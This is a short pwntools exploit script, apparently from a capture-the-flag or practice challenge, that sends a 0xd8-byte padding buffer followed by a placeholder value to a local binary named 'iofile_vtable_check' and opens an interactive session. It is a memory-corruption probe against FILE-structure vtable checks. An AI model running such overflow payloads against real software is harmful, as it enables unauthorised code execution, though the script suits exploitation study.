from pwn import *
p = process('iofile_vtable_check')
#raw_input('debug: ' + str(p.pid))
p.recvrepeat(1)
p.send('a'*0xd8 + 'DEADBE')
p.interactive()
